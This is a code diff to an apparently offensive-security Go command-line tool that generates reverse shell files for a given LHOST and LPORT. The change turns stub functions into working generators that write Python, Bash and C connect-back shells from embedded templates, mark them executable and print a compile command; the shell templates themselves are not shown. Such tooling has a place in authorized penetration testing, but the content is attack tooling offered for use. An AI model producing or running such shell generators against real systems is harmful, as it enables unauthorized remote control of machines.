@@ -1,6 +1,5 @@
 /*
 Copyright © 2022 RON AMOSA <ron@cloudbuilder.io>
-
 */
 package cmd
 
@@ -50,20 +49,20 @@ var shellCmd = &cobra.Command{
 		switch {
 		case shell == "php":
 			createPhpSh(LHOST, LPORT)
-		case shell == "py":
+		case shell == "py" || shell == "python":
 			createPySh(LHOST, LPORT)
 		case shell == "bash":
 			createBashSh(LHOST, LPORT)
 		case shell == "bin":
 			createBinSh(LHOST, LPORT)
 		default:
-			fmt.Println("Did you select an available shell?")
+			fmt.Println("Did you select an available shell? Options: php, python/py, bash, bin")
 		}
 	},
 }
 
 func createPhpSh(ipaddress string, port string) (bool, error) {
-	fmt.Printf("PHP shell for %v:%s", ipaddress, port)
+	fmt.Printf("PHP shell for %v:%s\n", ipaddress, port)
 	tmpl := template.Must(template.ParseFS(shellFS, "templates/shells/php/sh.tmpl"))
 
 	// create output file
@@ -83,23 +82,92 @@ func createPhpSh(ipaddress string, port string) (bool, error) {
 	} else {
 		// create shell
 		tmpl.Execute(file, target)
+		fmt.Println("Created PHP shell at shell.php")
 		return true, nil
 	}
 }
 
 func createPySh(ipaddress string, port string) (bool, error) {
-	fmt.Printf("Python shell for %v:%s", ipaddress, port)
-	return true, nil
+	fmt.Printf("Python shell for %v:%s\n", ipaddress, port)
+	tmpl := template.Must(template.ParseFS(shellFS, "templates/shells/python/sh.tmpl"))
+
+	// create output file
+	file, err := os.Create("shell.py")
+
+	// create target struct
+	target := Target{
+		Name:      "",
+		IPAddress: ipaddress,
+		Port:      port,
+	}
+
+	// check for errors
+	if err != nil {
+		fmt.Println(err)
+		return false, nil
+	} else {
+		// create shell
+		tmpl.Execute(file, target)
+		fmt.Println("Created Python shell at shell.py")
+		// Make the file executable
+		os.Chmod("shell.py", 0755)
+		return true, nil
+	}
 }
 
 func createBashSh(ipaddress string, port string) (bool, error) {
-	fmt.Printf("Bash shell for %v:%s ", ipaddress, port)
-	return true, nil
+	fmt.Printf("Bash shell for %v:%s\n", ipaddress, port)
+	tmpl := template.Must(template.ParseFS(shellFS, "templates/shells/bash/sh.tmpl"))
+
+	// create output file
+	file, err := os.Create("shell.sh")
+
+	// create target struct
+	target := Target{
+		Name:      "",
+		IPAddress: ipaddress,
+		Port:      port,
+	}
+
+	// check for errors
+	if err != nil {
+		fmt.Println(err)
+		return false, nil
+	} else {
+		// create shell
+		tmpl.Execute(file, target)
+		fmt.Println("Created Bash shell at shell.sh")
+		// Make the file executable
+		os.Chmod("shell.sh", 0755)
+		return true, nil
+	}
 }
 
 func createBinSh(ipaddress string, port string) (bool, error) {
-	fmt.Printf("Bin shell for %v:%s", ipaddress, port)
-	return true, nil
+	fmt.Printf("Binary C shell for %v:%s\n", ipaddress, port)
+	tmpl := template.Must(template.ParseFS(shellFS, "templates/shells/bin/sh.tmpl"))
+
+	// create output file
+	file, err := os.Create("revshell.c")
+
+	// create target struct
+	target := Target{
+		Name:      "",
+		IPAddress: ipaddress,
+		Port:      port,
+	}
+
+	// check for errors
+	if err != nil {
+		fmt.Println(err)
+		return false, nil
+	} else {
+		// create shell
+		tmpl.Execute(file, target)
+		fmt.Println("Created C source file at revshell.c")
+		fmt.Println("Compile with: gcc -o revshell revshell.c")
+		return true, nil
+	}
 }
 
 func init() {
